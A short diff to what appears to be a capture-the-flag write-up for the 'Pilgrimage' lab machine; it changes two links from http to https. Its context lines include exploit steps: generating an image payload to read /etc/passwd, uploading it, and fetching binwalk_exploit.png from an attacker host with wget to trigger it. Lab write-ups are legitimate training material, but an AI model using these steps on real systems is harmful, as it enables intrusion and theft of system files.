@@ -113,7 +113,7 @@ Using the script above, we'll generate an image:
 python3 generate.py -f "/etc/passwd" -o exploit.png
 ```
 
-Then we can upload the image to this [website](http://pilgrimage.htb/), running on the machine at port 80. And download the image via the link shrunk given by the site
+Then we can upload the image to this [website](https://pilgrimage.htb/), running on the machine at port 80. And download the image via the link shrunk given by the site
 Then use the `identify` command to extract image information
 
 ```bash
@@ -311,7 +311,7 @@ Then use wget to request HTTP server
 wget http://<YOUR-IP>/binwalk_exploit.png
 ```
 
-And read the following url to trigger the payload : <http://pilgrimage.htb/shrunk/binwalk_exploit.png>
+And read the following url to trigger the payload : <https://pilgrimage.htb/shrunk/binwalk_exploit.png>
 
 ```bash
 ┌──(rether㉿rether)-[~]
